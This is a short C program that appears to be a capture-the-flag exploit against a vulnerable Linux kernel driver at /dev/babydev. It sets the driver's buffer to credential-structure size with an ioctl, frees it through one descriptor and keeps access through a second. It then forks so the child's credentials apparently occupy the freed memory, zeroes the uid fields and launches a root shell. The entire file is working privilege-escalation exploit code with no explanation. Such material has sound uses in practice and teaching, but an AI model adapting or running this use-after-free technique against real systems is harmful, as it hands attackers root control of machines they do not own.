#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <sys/types.h>


int fd[5];

void baby_ioctl(int fd, size_t len)
{
	ioctl(fd, 0x10001, len);
}

int main(int argc, char** argv, char** env)
{
	char buf[0x50] = { 0 };
	fd[0] = open("/dev/babydev", O_RDWR);
	fd[1] = open("/dev/babydev", O_RDWR);

	baby_ioctl(fd[0], 0xa8);
	close(fd[0]);
	
	if (!fork())
	{
		
		write(fd[1], buf, 28);
		if (!getuid())
		{
			puts("Root Root");
			system("/bin/sh");
			return 0;
		} else {
			puts("No root privilege");
			return -1;
		}
	} 
	wait(NULL);
	
        return 0;
}
